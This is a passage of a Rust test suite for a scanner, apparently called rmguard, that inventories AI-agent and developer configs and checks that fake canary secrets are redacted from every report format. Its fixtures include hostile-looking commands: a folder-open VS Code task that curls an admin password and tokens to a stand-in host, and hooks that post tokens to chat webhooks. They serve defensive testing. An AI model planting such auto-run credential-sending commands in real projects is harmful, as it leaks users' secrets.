        r#"{"version":"2.0.0","tasks":[{"label":"t","command":"curl","args":["-d","{\"username\":\"admin\",\"password\":\"E2EJSONBODY\"}","--header=\"Private-Token: E2EGLTOK\"","-H","Authorization: Token E2ETASKDRF","https://tasks.internal"],"runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();
    fs::write(
        home.join(".npmrc"),
        "//npm.internal/:_authToken=E2ENPMTOK\nregistry=https://u:E2ENPMREG@npm.internal/\n",
    )
    .unwrap();
    fs::write(
        home.join(".pip/pip.conf"),
        "[global]\nindex-url = https://u:E2EPIP@pypi.internal/simple\ntrusted-host = u:E2EPIPHOST@pypi.internal\n",
    )
    .unwrap();
    fs::write(home.join(".yarnrc"), "registry \"https://u:E2EYARN1@yarn.internal/\"\n").unwrap();
    fs::write(
        home.join(".yarnrc.yml"),
        "registry: \"https://u:E2EYARN2@yarn.internal/\"\nnpmRegistryServer: \"https://u:E2EYARN3@yarn.internal/\"\n",
    )
    .unwrap();
    fs::write(
        home.join(".bunfig.toml"),
        "[install]\nregistry = \"https://u:E2EBUN@bun.internal/\"\n",
    )
    .unwrap();
    // Inline API keys in agent configs and a bare Hugging Face token: names only.
    fs::create_dir_all(home.join(".continue")).unwrap();
    fs::write(home.join(".continue/config.yaml"), "models:\n  - provider: openai\n    apiKey: E2ECONTINUEKEY\n  - provider: a\n    apiKey: ${{ secrets.ANTHROPIC }}\n").unwrap();
    fs::write(
        home.join(".aider.conf.yml"),
        "model: gpt-4o\nopenai-api-key: E2EAIDERKEY\n",
    )
    .unwrap();
    fs::create_dir_all(home.join(".cache/huggingface")).unwrap();
    fs::write(home.join(".cache/huggingface/token"), "E2EHFTOKEN").unwrap();
    // Agent-surface detections: a skill command, a settings helper, a proxy with
    // userinfo in a project .env, and an OLLAMA_HOST with userinfo in a shell profile.
    fs::create_dir_all(proj.join(".claude/commands")).unwrap();
    fs::write(
        proj.join(".claude/commands/ship.md"),
        "Ship: !`deploy --token E2ESKILLDYN https://skill.internal/`\n",
    )
    .unwrap();
    fs::write(
        proj.join(".claude/settings.local.json"),
        r#"{"apiKeyHelper":"./key.sh --token E2EHELPERTOK https://helper.internal/"}"#,
    )
    .unwrap();
    // A bare literal key in the user's own apiKeyHelper (no finding fires, but the
    // inventory field is serialized), and a NAME=value prefix in awsAuthRefresh.
    fs::create_dir_all(home.join(".claude")).unwrap();
    fs::write(
        home.join(".claude/settings.json"),
        r#"{"apiKeyHelper":"echo sk-ant-api03-E2EANTLITERALab0123456789xyzXYZ","awsAuthRefresh":"MYPASS=E2EPLAINPASS aws sso login"}"#,
    )
    .unwrap();
    fs::write(
        proj.join(".env"),
        "HTTPS_PROXY=http://u:E2EPROXYUSER@proxy.internal:3128\n",
    )
    .unwrap();
    fs::write(
        home.join(".bashrc"),
        "export OLLAMA_HOST=http://u:E2EOLLAMAUSER@0.0.0.0:11434\n",
    )
    .unwrap();
    fs::create_dir_all(home.join(".claude/plugins")).unwrap();
    fs::write(
        home.join(".claude/plugins/known_marketplaces.json"),
        r#"{"corp":{"source":{"source":"git","url":"https://oauth2:E2EMPTOK@gitlab.internal/plugins.git"},"installLocation":"/tmp/x","lastUpdated":"2026-01-01T00:00:00Z"}}"#,
    )
    .unwrap();

    let skip = "ssh,cloud,browser,extensions,containers,notebooks,ide,frameworks,ai,node,\
                transcripts,gitconfig,pypkgs,npmpkgs";
    fn canaries_in(text: &str) -> BTreeSet<String> {
        text.match_indices("E2E")
            .map(|(i, _)| {
                // Skip the "E2E" prefix itself: its digit used to end the match at one
                // character, so every canary was filtered out and this check was vacuous.
                let end = text[i + 3..]
                    .find(|c: char| !c.is_ascii_uppercase())
                    .map_or(text.len(), |o| i + 3 + o);
                text[i..end].to_string()
            })
            .filter(|c| c.len() > 3)
            .collect()
    }
    // The detector itself must see a canary, or every assertion below is vacuous.
    assert_eq!(
        canaries_in("x \"E2EFOO\" y").into_iter().collect::<Vec<_>>(),
        vec!["E2EFOO".to_string()]
    );
    for fmt in ["terminal", "json", "html", "blueprint"] {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(["--format", fmt, "--skip", skip])
            .env("HOME", &home)
            .env_remove("HF_HOME")
            .env_remove("HF_TOKEN_PATH")
            .env_remove("XDG_CACHE_HOME")
            .output()
            .expect("run rmguard");
        assert!(out.status.success(), "{fmt}: {}", String::from_utf8_lossy(&out.stderr));
        let text = String::from_utf8_lossy(&out.stdout);
        let leaked = canaries_in(&text);
        assert!(leaked.is_empty(), "{fmt}: secret values reached the report: {leaked:?}");
        if fmt == "json" {
            for host in [
                "r.internal",
                "db.internal",
                "k.internal",
                "gh.internal",
                "cmd.internal",
                "deploy.internal",
                "tasks.internal",
                "npm.internal",
                "pypi.internal",
                "yarn.internal",
                "bun.internal",
                "gitlab.internal",
                "Hugging Face",
                "Continue",
                "Aider",
                "skill.internal",
                "./key.sh --token <redacted> <redacted>",
                "proxy.internal",
                "0.0.0.0:11434",
                "MYPASS=<redacted> aws <redacted> <redacted>",
            ] {
                assert!(
                    text.contains(host),
                    "fixture for {host} never reached the report, so the canary check proves nothing for it"
                );
            }
        }
    }
    let _ = fs::remove_dir_all(&home);
}

/// Hooks everywhere: one canary per new surface (an exec-form argument, an http hook's
/// userinfo, query and header, a Copilot `env` value, a prompt's key=value, a module's
/// source, a frontmatter hook argument) reaches no output format and no --diff.
#[test]
fn no_hook_canary_reaches_any_output_or_diff() {
    use std::fs;
    let home = std::env::temp_dir().join(format!("rmg-e2e-hookcanary-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).unwrap();
    let home = fs::canonicalize(&home).unwrap();
    let proj = home.join("proj");
    let w = |p: std::path::PathBuf, t: &str| {
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, t).unwrap();
    };
    let skip = "ai,frameworks,ide,extensions,mcp,node,shell,ssh,cloud,containers,notebooks,browser,packages,rules,\
                aicreds,envfiles,transcripts,marketplaces,vscodetasks,gitconfig,pypkgs,npmpkgs,jbplugins,persistence";
    let run = |args: &[&str]| {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(args)
            .args(["--skip", skip])
            .env("HOME", &home)
            .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
            .current_dir(&home)
            .output()
            .expect("run rmguard");
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        String::from_utf8_lossy(&out.stdout).to_string()
    };
    w(
        home.join(".claude.json"),
        &format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display()),
    );
    let baseline = home.join("baseline.json");
    fs::write(&baseline, run(&["--format", "json"])).unwrap();

    w(
        proj.join(".claude/settings.json"),
        r#"{"hooks":{
            "PreToolUse":[{"hooks":[{"type":"command","command":"deploy","args":["--token","E2EHOOKARG","https://u:E2EARGUSER@hookarg.internal/"]}]}],
            "PostToolUse":[{"hooks":[{"type":"http","url":"https://u:E2EHTTPUSER@hookhttp.internal/h?token=E2EHTTPQUERY","headers":{"Authorization":"Bearer E2EHTTPHDR"},"allowedEnvVars":["E2EENVNAME"]}]}],
            "Stop":[{"hooks":[{"type":"prompt","prompt":"Summarize the session. api_key=E2EPROMPTKEY"}]}],
            "UserPromptSubmit":[{"hooks":[{"type":"agent","prompt":"Check the prose. The password is E2EPROSEPW, the secret is E2EPROSESECRET, apikey E2EPROSEAPIKEY, send header X-API-Key E2EPROSEHDR, login with admin / E2EPROSELOGIN"}]}]}}"#,
    );
    w(
        proj.join(".github/hooks/a.json"),
        r#"{"version":1,"hooks":{"sessionStart":[{"bash":"echo copilot-hook","env":{"T":"E2ECOPILOTENV"}}]}}"#,
    );
    w(
        home.join(".config/opencode/plugins/m.ts"),
        "const k = \"E2EMODSRC\";\nexport const M = async () => ({ event: async () => {} })\n",
    );
    w(
        proj.join(".claude/skills/s/SKILL.md"),
        "---\nname: s\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: \"deploy --token E2EFMTOK https://fm.internal/\"\n---\nbody\n",
    );
    fn canaries_in(text: &str) -> Vec<String> {
        text.match_indices("E2E")
            .map(|(i, _)| {
                let end = text[i + 3..]
                    .find(|c: char| !c.is_ascii_uppercase())
                    .map_or(text.len(), |o| i + 3 + o);
                text[i..end].to_string()
            })
            .filter(|c| c.len() > 3)
            .collect()
    }
    let base = baseline.to_string_lossy().to_string();
    for args in [
        vec!["--format", "terminal"],
        vec!["--format", "json"],
        vec!["--format", "html"],
        vec!["--format", "blueprint"],
        vec!["--diff", base.as_str()],
    ] {
        let text = run(&args);
        let leaked = canaries_in(&text);
        assert!(
            leaked.is_empty(),
            "{args:?}: secret values reached the output: {leaked:?}"
        );
        if args[1] == "json" {
            for shown in [
                "hookarg.internal",
                "hookhttp.internal",
                "Summarize the session",
                "Check the prose",
                "echo copilot-hook",
                "m.ts",
                "fm.internal",
            ] {
                assert!(
                    text.contains(shown),
                    "fixture for {shown} never reached the report, so the canary check proves nothing for it"
                );
            }
        }
        if args[0] == "--diff" {
            assert!(
                text.contains("hookarg.internal") || text.contains("settings.json"),
                "the diff saw the new hook file: {text}"
            );
        }
    }
    let _ = fs::remove_dir_all(&home);
}

/// Webhook URLs whose path is the secret, Cookie headers, password flags that are not
/// named like secrets, and unprefixed key-shaped words: the shapes a Stop or
/// Notification hook posting to a chat carries (review of f4dbf35). The host stays.
#[test]
fn command_text_redacts_webhooks_cookies_flags_and_key_words() {
    use rustmachineguard::scanners::redact_command_text as cmd;
    for (canary, raw, kept) in [
        (
            "Zq8vK3mN7pR2tW9xY4bC6dFg",
            "curl -X POST https://hooks.slack.com/services/T0/B0/Zq8vK3mN7pR2tW9xY4bC6dFg",
            "hooks.slack.com",
        ),
        (
            "WFLOWSECRETx9",
            "curl https://hooks.slack.com/workflows/T0/A0/1/WFLOWSECRETx9",
            "hooks.slack.com",
        ),
        (
            "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9v",
            "curl https://discord.com/api/webhooks/1234567890123456789/aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5bC7dE9fG1hJ3kL5mN7pQ9rS1tU3v",
            "discord.com",
        ),
        (
            "DISCV10x",
            "curl 'https://discordapp.com/api/v10/webhooks/1/DISCV10x'",
            "discordapp.com",
        ),
        (
            "AAH4kX9mP2qR7sT1vW3yZ5bD8fG0hJ6kL4n",
            "curl https://api.telegram.org/bot7012345678:AAH4kX9mP2qR7sT1vW3yZ5bD8fG0hJ6kL4n/sendMessage",
            "api.telegram.org",
        ),
        (
            "k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
            "curl -H 'Cookie: session=s%3Ak3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe' https://app.internal",
            "app.internal",
        ),
        (
            "COOKIETWO",
            "curl -H \"Cookie: a=1; sid=COOKIETWO\" https://app.internal",
            "app.internal",
        ),
        (
            "SETCOOKIE",
            "curl --header=Set-Cookie:sid=SETCOOKIE https://app.internal",
            "app.internal",
        ),
        ("Tr0ub4dor", "tool --pass Tr0ub4dor&3horse", "tool --pass"),
        ("Tr0ub4dor", "tool --passwd=Tr0ub4dor", "tool --passwd="),
        (
            "k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
            "tool -t k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
            "tool -t",
        ),
        (
            "uQiRzpo4DXghDmr9QzzfQu27cmVRsG",
            "pushover --user uQiRzpo4DXghDmr9QzzfQu27cmVRsG --app azGDORePK8gMaC0QOYAMyEEuzJnyUi",
            "pushover --user",
        ),
        (
            "azGDORePK8gMaC0QOYAMyEEuzJnyUi",
            "pushover --user uQiRzpo4DXghDmr9QzzfQu27cmVRsG --app azGDORePK8gMaC0QOYAMyEEuzJnyUi",
            "--app",
        ),
        (
            "WEBHOOKPATH",
            "notify --webhook https://example.com/hook/WEBHOOKPATH",
            "https://example.com/",
        ),
        (
            "k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
            "curl https://example.com/hook/k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe -d @-",
            "https://example.com/hook/",
        ),
    ] {
        let out = cmd(raw);
        assert!(!out.contains(canary), "{raw:?} -> {out:?}");
        assert!(out.contains(kept), "over-redacted {raw:?} -> {out:?}");
        assert_eq!(cmd(&out), out, "not idempotent: {raw:?}");
    }
    // Exec form: one element per line. An unquoted Cookie value runs to its line's end.
    let out = cmd("curl\n-H\nCookie: a=1; sid=EXECCOOKIE\nhttps://app.internal");
    assert!(
        !out.contains("EXECCOOKIE") && out.ends_with("\nhttps://app.internal"),
        "{out:?}"
    );
    // The global redactor (every surface) drops the webhook and cookie shapes too.
    for raw in [
        "https://hooks.slack.com/services/T0/B0/GLOBALSLACK",
        "-H 'Cookie: sid=GLOBALCOOKIE'",
    ] {
        assert!(!redact(raw).contains("GLOBAL"), "{raw:?} -> {:?}", redact(raw));
    }
    for benign in [
        "curl -H 'Accept: application/json' https://hooks.example.com/x",
        "npx prettier --write src/index.ts",
        "osascript -e 'display notification \"done\"'",
        "jq -r .message | curl -s -d @- https://ntfy.sh/claude-alerts",
    ] {
        assert_eq!(cmd(benign), benign, "over-redacted a benign hook");
    }
}

/// The same shapes as hook commands of every form, end to end: shell form, exec-form
/// `args` (including an element with a line break after a credential flag), a matcher,
/// an unknown handler type and an mcp_tool server. No value reaches any output format.
#[test]
fn hook_webhook_cookie_and_flag_canaries_reach_no_output() {
    use std::fs;
    let home = std::env::temp_dir().join(format!("rmg-e2e-hookshapes-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).unwrap();
    let home = fs::canonicalize(&home).unwrap();
    let proj = home.join("proj");
    fs::create_dir_all(proj.join(".claude")).unwrap();
    fs::write(
        home.join(".claude.json"),
        format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display()),
    )
    .unwrap();
    let settings = serde_json::json!({"hooks": {
        "Stop": [{"hooks": [
            {"type": "command", "command": "curl", "args": ["-X", "POST", "https://hooks.slack.com/services/T0/B0/Zq8vK3mN7pR2tW9xY4bC6dFg"]},
            {"type": "command", "command": "curl -X POST https://hooks.slack.com/services/T0/B0/Zq8vK3mN7pR2tW9xY4bC6dFg"},
            {"type": "command", "command": "curl https://discord.com/api/webhooks/1234567890123456789/aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5bC7dE9fG1hJ3kL5mN7pQ9rS1tU3v"},
            {"type": "command", "command": "curl https://api.telegram.org/bot7012345678:AAH4kX9mP2qR7sT1vW3yZ5bD8fG0hJ6kL4n/sendMessage"},
            {"type": "command", "command": "curl -H 'Cookie: session=s%3Ak3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe' https://app.internal"},
            {"type": "command", "command": "tool --pass Tr0ub4dor&3horse"},
            {"type": "command", "command": "tool -t k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe"},
            {"type": "command", "command": "pushover --user uQiRzpo4DXghDmr9QzzfQu27cmVRsG --app azGDORePK8gMaC0QOYAMyEEuzJnyUi"},
            {"type": "command", "command": "notify --webhook https://example.com/hook/k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe"},
            {"type": "command", "command": "tool", "args": ["--secret", "multi\nline k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe"]},
            {"type": "sk-ant-api03-TYPECANARYk3J9x2Qp7Lm4Zr8Tn5Vb"},
            {"type": "mcp_tool", "server": "srv --api-key MCPSRVCANARY", "tool": "t"}
        ]}],
        "PreToolUse": [{"matcher": "Bash --token MATCHERCANARY", "hooks": [{"type": "command", "command": "echo m"}]}]
    }});
    fs::write(proj.join(".claude/settings.json"), settings.to_string()).unwrap();
    let skip = "ai,frameworks,ide,extensions,mcp,node,shell,ssh,cloud,containers,notebooks,browser,packages,rules,skills,\
                aicreds,envfiles,transcripts,marketplaces,vscodetasks,gitconfig,pypkgs,npmpkgs,jbplugins,persistence";
    let run = |format: &str| {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(["--format", format, "--skip", skip])
            .env("HOME", &home)
            .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
            .current_dir(&home)
            .output()
            .expect("run rmguard");
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        String::from_utf8_lossy(&out.stdout).to_string()
    };
    let canaries = [
        "Zq8vK3mN7pR2tW9xY4bC6dFg",
        "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9v",
        "AAH4kX9mP2qR7sT1vW3yZ5bD8fG0hJ6kL4n",
        "k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
        "Tr0ub4dor",
        "uQiRzpo4DXghDmr9QzzfQu27cmVRsG",
        "azGDORePK8gMaC0QOYAMyEEuzJnyUi",
        "TYPECANARY",
        "MCPSRVCANARY",
        "MATCHERCANARY",
    ];
    for format in ["terminal", "json", "html", "blueprint"] {
        let text = run(format);
        let leaked: Vec<&str> = canaries.iter().copied().filter(|c| text.contains(c)).collect();
        assert!(leaked.is_empty(), "{format}: {leaked:?}");
        if format == "json" {
            for shown in [
                "hooks.slack.com",
                "discord.com",
                "api.telegram.org",
                "app.internal",
                "pushover",
                "example.com",
                "srv",
            ] {
                assert!(text.contains(shown), "{shown}: the fixture never reached the report");
            }
        }
    }
    let _ = fs::remove_dir_all(&home);
}

/// Review of b21286f: an assignment whose key is a short secret word (`PASS`, `PWD`,
/// `PAT`, `SK`, `JWT`, `WEBHOOK`) was shown verbatim in every format. The value goes;
/// the key and the program stay. Controls: keys that only contain those letters
/// (`TASK_ID`, `DISK_SIZE`, `PASSENGERS`) keep their values.
#[test]
fn short_secret_word_assignments_are_redacted_in_every_format() {
    use std::fs;
    let home = std::env::temp_dir().join(format!("rmg-e2e-shortwords-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).unwrap();
    let home = fs::canonicalize(&home).unwrap();
    let proj = home.join("proj");
    fs::create_dir_all(proj.join(".claude")).unwrap();
    fs::write(
        home.join(".claude.json"),
        format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display()),
    )
    .unwrap();
    let settings = serde_json::json!({"hooks": {
        "Stop": [{"hooks": [
            {"type": "command", "command": "MY_PASS=PASSHOOKCANARY ./notify.sh"},
            {"type": "command", "command": "export DB_PWD=PWDHOOKCANARY; ./db.sh"},
            {"type": "command", "command": "GITHUB_PAT=PATHOOKCANARY STRIPE_SK=SKHOOKCANARY JWT=JWTHOOKCANARY ./deploy.sh"},
            {"type": "command", "command": "TASK_ID=TASKVISIBLE1 DISK_SIZE=DISKVISIBLE2 PASSENGERS=PASSENGERSVISIBLE3 ./count.sh"}
        ]}]
    }});
    fs::write(proj.join(".claude/settings.json"), settings.to_string()).unwrap();
    let skip = "ai,frameworks,ide,extensions,mcp,node,shell,ssh,cloud,containers,notebooks,browser,packages,rules,skills,\
                aicreds,envfiles,transcripts,marketplaces,vscodetasks,gitconfig,pypkgs,npmpkgs,jbplugins,persistence";
    let run = |format: &str| {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(["--format", format, "--skip", skip])
            .env("HOME", &home)
            .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
            .current_dir(&home)
            .output()
            .expect("run rmguard");
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        String::from_utf8_lossy(&out.stdout).to_string()
    };
    let canaries = [
        "PASSHOOKCANARY",
        "PWDHOOKCANARY",
        "PATHOOKCANARY",
        "SKHOOKCANARY",
        "JWTHOOKCANARY",
    ];
    for format in ["terminal", "json", "html", "blueprint"] {
        let text = run(format);
        let leaked: Vec<&str> = canaries.iter().copied().filter(|c| text.contains(c)).collect();
        assert!(leaked.is_empty(), "{format}: {leaked:?}");
        if format == "json" {
            for shown in ["MY_PASS", "notify.sh", "DB_PWD", "GITHUB_PAT", "STRIPE_SK", "deploy.sh"] {
                assert!(text.contains(shown), "{shown}: the fixture never reached the report");
            }
            for kept in ["TASKVISIBLE1", "DISKVISIBLE2", "PASSENGERSVISIBLE3"] {
                assert!(text.contains(kept), "{kept}: a non-secret key's value was redacted");
            }
        }
    }
    let _ = fs::remove_dir_all(&home);
}

/// Review of 4e3f8c3: an Authorization header written as code (a node/python one-liner,
/// a JSON object), registry-login `-p`, `--bearer`, and the `config set KEY VALUE` forms
/// of npm/yarn/pnpm/aws. The value goes; the program, flag, key and scheme stay.
#[test]
fn code_authorization_and_login_and_config_set_values_are_redacted() {
    use rustmachineguard::scanners::redact_command_text as cmd;
    for (canary, raw, kept) in [
        (
            "CODEAUTH1",
            "node -e \"fetch(url,{headers:{Authorization:'Bearer CODEAUTH1'}})\"",
            "Authorization:'Bearer ",
        ),
        (
            "CODEAUTH2",
            "\"Authorization\": \"Bearer CODEAUTH2\"",
            "\"Authorization\": \"",
        ),
        (
            "CODEAUTH3",
            "python3 -c \"requests.get(u, headers={'Authorization': 'token CODEAUTH3'})\"",
            "'Authorization': '",
        ),
        (
            "CODEAUTH4",
            "fetch(u,{headers:{'Proxy-Authorization':'Basic CODEAUTH4'}})",
            "Proxy-Authorization",
        ),
        (
            "CODEAUTH5",
            "fetch(u,{headers:{Authorization:`CODEAUTH5`}})",
            "Authorization:`",
        ),
        (
            "LOGINP",
            "docker login -p LOGINP -u u registry.internal",
            "docker login -p ",
        ),
        (
            "LOGINPW",
            "podman login --password LOGINPW registry.internal",
            "--password ",
        ),
        (
            "LOGINHELM",
            "helm registry login registry.internal -u u -p LOGINHELM",
            "helm registry login",
        ),
        (
            "LOGINEQ",
            "docker login --password=LOGINEQ registry.internal",
            "--password=",
        ),
        ("BEARERFLAG", "tool --bearer BEARERFLAG", "tool --bearer"),
        ("BEARERFLAG2", "tool --bearer=BEARERFLAG2", "tool --bearer="),
        (
            "NPMSET",
            "npm config set //r.example/:_authToken NPMSET",
            "//r.example/:_authToken",
        ),
        (
            "NPMSETEQ",
            "npm config set //r.example/:_authToken=NPMSETEQ",
            "//r.example/:_authToken=",
        ),
        ("YARNSET", "yarn config set npmAuthToken YARNSET", "npmAuthToken"),
        ("PNPMSET", "pnpm config set //r.example/:_password PNPMSET", "_password"),
        ("NPMAUTH", "npm config set //r.example/:_auth NPMAUTH", "_auth"),
        (
            "AWSSET",
            "aws configure set aws_secret_access_key AWSSET --profile dev",
            "aws_secret_access_key",
        ),
        (
            "AWSTOK",
            "aws configure set aws_session_token AWSTOK",
            "aws_session_token",
        ),
    ] {
        let out = cmd(raw);
        assert!(!out.contains(canary), "{raw:?} -> {out:?}");
        assert!(out.contains(kept), "over-redacted {raw:?} -> {out:?}");
        assert_eq!(cmd(&out), out, "not idempotent: {raw:?}");
    }
    for benign in [
        // A port, a variable reference and a non-secret key stay readable.
        "docker run -p 8080:80 nginx",
        "fetch(u,{headers:{Authorization:`${TOKEN}`}})",
        "npm config set registry https://registry.npmjs.org/",
        "aws configure set region eu-west-1",
        // `-p` on an unknown program is a port or a path (a recorded choice).
        "./deploy -p 8443",
    ] {
        assert_eq!(cmd(benign), benign, "over-redacted a benign command");
    }
}

/// The same shapes as hook commands and exec-form args, end to end: no value reaches any
/// output format.
#[test]
fn round4_redactor_canaries_reach_no_output() {
    use std::fs;
    let home = std::env::temp_dir().join(format!("rmg-e2e-round4-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).unwrap();
    let home = fs::canonicalize(&home).unwrap();
    let proj = home.join("proj");
    fs::create_dir_all(proj.join(".claude")).unwrap();
    fs::write(
        home.join(".claude.json"),
        format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display()),
    )
    .unwrap();
    let settings = serde_json::json!({"hooks": {
        "Stop": [{"hooks": [
            {"type": "command", "command": "node", "args": ["-e", "fetch('https://x',{headers:{Authorization:'Bearer CANARYB15'}})"]},
            {"type": "command", "command": "node -e \"fetch(u,{headers:{'Authorization': 'Bearer CANARYB16'}})\""},
            {"type": "command", "command": "docker login -p CANARYA6 -u u"},
            {"type": "command", "command": "npm config set //r.example/:_authToken CANARYA14"},
            {"type": "command", "command": "aws configure set aws_secret_access_key CANARYA15"},
            {"type": "command", "command": "tool --bearer CANARYA24"},
            {"type": "prompt", "prompt": "My passwords is CANARYC3x. API_TOKEN CANARYC6x. Use 'Summer2024!C8' as the password. Login as admin with Summer2024C9. passphrase: horse battery CANARYC11 staple. The db pass C12Hunter. My secret, which you need, PROMPTSEC10CANARY"}
        ]}]
    }});
    fs::write(proj.join(".claude/settings.json"), settings.to_string()).unwrap();
    let skip = "ai,frameworks,ide,extensions,mcp,node,shell,ssh,cloud,containers,notebooks,browser,packages,rules,skills,\
                aicreds,envfiles,transcripts,marketplaces,vscodetasks,gitconfig,pypkgs,npmpkgs,jbplugins,persistence";
    let run = |format: &str| {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(["--format", format, "--skip", skip])
            .env("HOME", &home)
            .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
            .current_dir(&home)
            .output()
            .expect("run rmguard");
        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
        String::from_utf8_lossy(&out.stdout).to_string()
    };
    let canaries = [
        "CANARYB15",
        "CANARYB16",
        "CANARYA6",
        "CANARYA14",
        "CANARYA15",
        "CANARYA24",
        "CANARYC3x",
        "CANARYC6x",
        "Summer2024!C8",
        "Summer2024C9",
        "CANARYC11",
        "C12Hunter",
        "PROMPTSEC10CANARY",
    ];
    for format in ["terminal", "json", "html", "blueprint"] {
        let text = run(format);
        let leaked: Vec<&str> = canaries.iter().copied().filter(|c| text.contains(c)).collect();
        assert!(leaked.is_empty(), "{format}: {leaked:?}");
        if format == "json" {
            for shown in [
                "docker login",
                "_authToken",
                "aws_secret_access_key",
                "--bearer",
                "Authorization",
            ] {
                assert!(text.contains(shown), "{shown}: the fixture never reached the report");
            }
        }
    }
    let _ = fs::remove_dir_all(&home);
}

/// Claude Code keeps synced skills under `~/.claude/skills/synced/<org>_<account>/`:
/// the directory name is the user's organization and account UUIDs, the same
/// identifiers `~/.claude.json`'s `oauthAccount` holds and no report prints. Both UUIDs
/// are canaries: no output format and no `--diff` may carry them, the masked segment is
/// shown in their place, and a diff of two scans of one fixture is empty (the key is
/// stable).
#[test]
fn synced_skill_account_identifiers_reach_no_output() {
    use std::fs;
    const ORG: &str = "0E2E0A1B-2C3D-4E5F-8A9B-0C1D2E3F4A5B";
    const ACCT: &str = "1e2e0a1b-2c3d-4e5f-8a9b-0c1d2e3f4a5c";
    const BARE: &str = "2e2e0a1b-2c3d-4e5f-8a9b-0c1d2e3f4a5d";
    let home = std::env::temp_dir().join(format!("rmg-e2e-synced-uuid-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(&home).unwrap();
    let home = fs::canonicalize(&home).unwrap();
    let w = |p: std::path::PathBuf, t: &str| {
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, t).unwrap();
    };
    let synced = home.join(".claude/skills/synced");
    w(
        synced.join(format!("{ORG}_{ACCT}/x/SKILL.md")),
        "---\nname: x\ndescription: synced x\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: \"echo synced-hook\"\n---\nContext: !`id`\n",
    );
    // A bundled script: its inventory name is its path relative to the skills
    // directory (`synced/<id>/x/scripts/run.py`), which the terminal, SBOM and Blueprint
    // print and build their references from.
    w(
        synced.join(format!("{ORG}_{ACCT}/x/scripts/run.py")),
        "import subprocess\nsubprocess.run(['id'])\n",
    );
    w(
        synced.join(format!("{BARE}/y/SKILL.md")),
        "---\nname: y\ndescription: synced y\n---\nbody\n",
    );
    // A link out of the synced directory: its target is reported too.
    #[cfg(unix)]
    std::os::unix::fs::symlink(
        synced.join(format!("{ORG}_{ACCT}/x/SKILL.md")),
        synced.join(format!("{ORG}_{ACCT}/z.md")),
    )
    .unwrap();
    w(home.join(".claude.json"), "{}");
    let skip = "ai,frameworks,ide,extensions,mcp,node,shell,ssh,cloud,containers,notebooks,browser,packages,\
                aicreds,envfiles,transcripts,marketplaces,vscodetasks,gitconfig,pypkgs,npmpkgs,jbplugins,persistence";
    let run = |args: &[&str]| {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(args)
            .args(["--skip", skip])
            .env("HOME", &home)
            .env("RMGUARD_TEST_SYSTEM_ROOT", home.join("sysroot"))
            .current_dir(&home)
            .output()
            .expect("run rmguard");
        assert!(
            out.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8_lossy(&out.stdout).to_string()
    };
    let leaked = |text: &str| -> Vec<&str> {
        let lower = text.to_ascii_lowercase();
        [ORG, ACCT, BARE]
            .into_iter()
            .filter(|u| lower.contains(&u.to_ascii_lowercase()))
            .collect()
    };
    let baseline = home.join("baseline.json");
    fs::write(&baseline, run(&["--format", "json"])).unwrap();
    let base = baseline.to_string_lossy().to_string();
    // A baseline written before the mask (837d9aa and earlier) carries the raw names.
    let raw_baseline = home.join("baseline-raw.json");
    fs::write(
        &raw_baseline,
        fs::read_to_string(&baseline)
            .unwrap()
            .replace("<org>_<account>", &format!("{ORG}_{ACCT}"))
            .replace("<account>", BARE),
    )
    .unwrap();
    let raw_base = raw_baseline.to_string_lossy().to_string();
    for args in [
        vec!["--diff", raw_base.as_str()],
        vec!["--format", "terminal"],
        vec!["--format", "terminal", "--verbose"],
        vec!["--format", "json"],
        vec!["--format", "html"],
        vec!["--format", "sbom"],
        vec!["--format", "blueprint"],
